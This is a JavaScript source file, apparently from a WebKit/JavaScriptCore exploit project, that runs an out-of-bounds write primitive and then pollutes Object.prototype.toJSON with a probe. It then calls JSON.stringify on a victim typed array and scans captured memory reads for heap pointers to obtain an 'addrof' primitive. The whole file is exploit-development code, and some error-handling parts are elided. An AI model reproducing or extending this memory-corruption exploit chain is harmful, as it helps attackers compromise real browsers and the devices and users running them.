// js/script3/testArrayBufferVictimCrash.mjs (v73_PerfectedV64_FlowAndAnalysis)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V73_PV64FA = "OriginalHeisenbug_TypedArrayAddrof_v73_PerfectedV64_FlowAndAnalysis";

// Variáveis globais ao módulo para captura de dados pela sonda
let captured_fuzz_reads_for_AB_v73 = null;
let captured_fuzz_reads_for_DV_v73 = null;

let leak_target_buffer_v73 = null;
let leak_target_dataview_v73 = null;
let victim_typed_array_ref_v73 = null;
let probe_call_count_v73 = 0;
let all_probe_interaction_details_v73 = [];
let first_call_details_object_ref_v73 = null;

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;
const PROBE_CALL_LIMIT_V73 = 10;
const FUZZ_OFFSETS_V73 = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50];

function toJSON_TA_Probe_PerfectedV64Flow_v73() {
    probe_call_count_v73++;
    const call_num = probe_call_count_v73;
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V73_PV64FA,
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v73),
        this_is_C1: (this === first_call_details_object_ref_v73 && first_call_details_object_ref_v73 !== null),
        this_is_leak_target_AB: (this === leak_target_buffer_v73 && leak_target_buffer_v73 !== null),
        this_is_leak_target_DV: (this === leak_target_dataview_v73 && leak_target_dataview_v73 !== null),
        fuzz_capture_status: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1? ${current_call_details.this_is_C1}. IsLeakAB? ${current_call_details.this_is_leak_target_AB}. IsLeakDV? ${current_call_details.this_is_leak_target_DV}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V73) { all_probe_interaction_details_v73.push({...current_call_details}); return { recursion_stopped_v73: true, call: call_num }; }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating C1_details WITH PAYLOADS.`, "info");
            first_call_details_object_ref_v73 = current_call_details;
            if (leak_target_buffer_v73) current_call_details.payload_AB = leak_target_buffer_v73;
            if (leak_target_dataview_v73) current_call_details.payload_DV = leak_target_dataview_v73;
            all_probe_interaction_details_v73.push({...current_call_details});
            return current_call_details; // CORRIGIDO: Retornar C1_details explicitamente
        }
        else if (current_call_details.this_is_leak_target_AB && current_call_details.this_type === '[object ArrayBuffer]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET ArrayBuffer! Fuzzing and capturing to side-channel...`, "critical");
            let fuzzed_reads = [];
            try {
                let view = new DataView(this);
                for (const offset of FUZZ_OFFSETS_V73) {
                    let low=0,high=0,ptr_str="N/A",dbl=NaN,err_msg=null; if(view.byteLength<(offset+8)){err_msg="OOB";}else{low=view.getUint32(offset,true);high=view.getUint32(offset+4,true);ptr_str=new AdvancedInt64(low,high).toString(true);let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high;dbl=(new Float64Array(tb))[0];} fuzzed_reads.push({offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl,error:err_msg});
                    logS3(`    AB Fuzz @${toHex(offset)}: L=${toHex(low)} H=${toHex(high)} I64=${ptr_str} D=${dbl}${err_msg?' E:'+err_msg:''}`, "dev_verbose");
                }
                captured_fuzz_reads_for_AB_v73 = fuzzed_reads;
                current_call_details.fuzz_capture_status = `AB Fuzz captured ${fuzzed_reads.length} reads.`;
                logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_status}`, "vuln");
            } catch (e) { current_call_details.error_in_probe = e.message; /* ... */ }
            all_probe_interaction_details_v73.push({...current_call_details});
            return { marker_ab_fuzz_done_v73: true, call_num_processed: call_num };
        }
        else if (current_call_details.this_is_leak_target_DV && current_call_details.this_type === '[object DataView]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET DataView! Fuzzing and capturing to side-channel...`, "critical");
            let fuzzed_reads = [];
            try {
                let view = this;
                for (const offset of FUZZ_OFFSETS_V73) { /* ... (lógica de fuzzing como acima) ... */
                    let low=0,high=0,ptr_str="N/A",dbl=NaN,err_msg=null; if(view.byteLength<(offset+8)){err_msg="OOB";}else{low=view.getUint32(offset,true);high=view.getUint32(offset+4,true);ptr_str=new AdvancedInt64(low,high).toString(true);let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high;dbl=(new Float64Array(tb))[0];} fuzzed_reads.push({offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl,error:err_msg}); logS3(`    DV Fuzz @${toHex(offset)}: L=${toHex(low)} H=${toHex(high)} I64=${ptr_str} D=${dbl}${err_msg?' E:'+err_msg:''}`,"dev_verbose");
                }
                captured_fuzz_reads_for_DV_v73 = fuzzed_reads;
                current_call_details.fuzz_capture_status = `DV Fuzz captured ${fuzzed_reads.length} reads.`;
                logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_status}`, "vuln");
            } catch (e) { current_call_details.error_in_probe = e.message; /* ... */ }
            all_probe_interaction_details_v73.push({...current_call_details});
            return { marker_dv_fuzz_done_v73: true, call_num_processed: call_num };
        }
        else if (current_call_details.this_is_C1 && current_call_details.this_type === '[object Object]') { /* ... C1 re-entry, retornar this ... */
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is C1_details_obj (re-entry). Returning 'this'.`, "warn");
            all_probe_interaction_details_v73.push({...current_call_details});
            return this;
        }
        else { /* ... unexpected, retornar marcador ... */
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected: ${current_call_details.this_type}. Ret marker.`, "warn");
            all_probe_interaction_details_v73.push({...current_call_details});
            return `ProcessedCall${call_num}_Type${current_call_details.this_type.replace(/[^a-zA-Z0-9]/g, '')}`;
        }
    } catch (e_probe) { /* ... (tratamento de erro geral da sonda) ... */ }
}

export async function executeTypedArrayVictimAddrofTest_PerfectedV64_FlowAndAnalysis() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V73_PV64FA}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (PerfectedV64_FlowAndAnalysis) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V73_PV64FA} Init...`;

    captured_fuzz_reads_for_AB_v73 = null;
    captured_fuzz_reads_for_DV_v73 = null;
    probe_call_count_v73 = 0;
    all_probe_interaction_details_v73 = [];
    victim_typed_array_ref_v73 = null;
    first_call_details_object_ref_v73 = null;

    leak_target_buffer_v73 = new ArrayBuffer(0x80);
    leak_target_dataview_v73 = new DataView(new ArrayBuffer(0x80));

    let errorCapturedMain = null;
    let rawStringifyOutput = "N/A", stringifyOutput_parsed = null;
    let collected_probe_details_for_return = [];
    let addrof_A_result = { success: false, msg: "Addrof ArrayBuffer: Default (v73)" };
    let addrof_B_result = { success: false, msg: "Addrof DataView: Default (v73)" };
    let pollutionApplied = false, originalToJSONDescriptor = null;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);
        victim_typed_array_ref_v73 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_PerfectedV64Flow_v73, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v73)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v73);
            logS3(`  JSON.stringify completed. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try{ stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } catch(e){ /* ... */ }

            logS3("STEP 3: Analyzing fuzz data from side-channels (v73)...", "warn", FNAME_CURRENT_TEST);
            let heisenbugIndication = false;

            const process_captured_fuzz_reads = (fuzzed_reads_array, target_addrof_result, objTypeName) => {
                if (fuzzed_reads_array && Array.isArray(fuzzed_reads_array)) {
                    heisenbugIndication = true;
                    logS3(`  V73_ANALYSIS: Processing ${fuzzed_reads_array.length} captured fuzz reads for ${objTypeName}. Full data logged by probe.`, "good");
                    for (const read_attempt of fuzzed_reads_array) {
                        if (read_attempt.error) continue;
                        const highVal = parseInt(read_attempt.high, 16);
                        const lowVal = parseInt(read_attempt.low, 16);
                        let isPotentialPtr=false;
                        if (JSC_OFFSETS.JSValue && JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH !== undefined && JSC_OFFSETS.JSValue.TAG_MASK !== undefined && JSC_OFFSETS.JSValue.CELL_TAG !== undefined) {
                           isPotentialPtr = (highVal === JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH && (lowVal & JSC_OFFSETS.JSValue.TAG_MASK) === JSC_OFFSETS.JSValue.CELL_TAG);
                        }
                        if (!isPotentialPtr && (highVal > 0 || lowVal > 0x10000) && (highVal < 0x000F0000) && ((lowVal & 0x7) === 0) ) { isPotentialPtr = true; }

                        if(isPotentialPtr && !(highVal === 0 && lowVal === 0) ){
                            target_addrof_result.success = true;
                            target_addrof_result.msg = `V73 SUCCESS (${objTypeName} Fuzz): Ptr ${read_attempt.int64} @${read_attempt.offset}`;
                            logS3(`  !!!! V73 POTENTIAL POINTER for ${objTypeName} @${read_attempt.offset}: ${read_attempt.int64} !!!!`, "vuln");
                            break;
                        }
                    }
                    if(!target_addrof_result.success){ target_addrof_result.msg = `V73 Fuzz for ${objTypeName} no ptr. First read (from probe log): ${fuzzed_reads_array[0]?.int64 || 'N/A'}`; }
                } else if (!target_addrof_result.success) { target_addrof_result.msg = `V73 No fuzz data in side-channel for ${objTypeName}.`; }
            };

            process_captured_fuzz_reads(captured_fuzz_reads_for_AB_v73, addrof_A_result, "ArrayBuffer");
            process_captured_fuzz_reads(captured_fuzz_reads_for_DV_v73, addrof_B_result, "DataView");

            if(!heisenbugIndication && first_call_details_object_ref_v73){ const c1 = first_call_details_object_ref_v73; if(c1.payload_AB || c1.payload_DV) heisenbugIndication = true;}

            if(addrof_A_result.success||addrof_B_result.success){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V73_PV64FA}: Addr SUCCESS!`;}
            else if(heisenbugIndication){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V73_PV64FA}: Heisenbug OK, Addr Fail`;}
            else{document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V73_PV64FA}: No Heisenbug?`;}

        } catch (e) { errorCapturedMain = e; /* ... */ } finally { /* ... */ }
    } catch (e) { errorCapturedMain = e; /* ... */ }
    finally {
        if (all_probe_interaction_details_v73 && Array.isArray(all_probe_interaction_details_v73)) {
            collected_probe_details_for_return = all_probe_interaction_details_v73.map(d => (d && typeof d === 'object' ? {...d} : d));
        } else { collected_probe_details_for_return = []; }
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        // ... (logs finais e limpeza de globais) ...
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v73}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        // Limpeza
        victim_typed_array_ref_v73 = null; all_probe_interaction_details_v73 = []; probe_call_count_v73 = 0; first_call_details_object_ref_v73 = null; leak_target_buffer_v73 = null; leak_target_dataview_v73 = null; captured_fuzz_reads_for_AB_v73 = null; captured_fuzz_reads_for_DV_v73 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain, stringifyResult: stringifyOutput_parsed, rawStringifyForAnalysis: rawStringifyOutput,
        all_probe_calls_for_analysis: collected_probe_details_for_return, total_probe_calls: probe_call_count_v73,
        addrof_A_result: addrof_A_result, addrof_B_result: addrof_B_result
    };
};
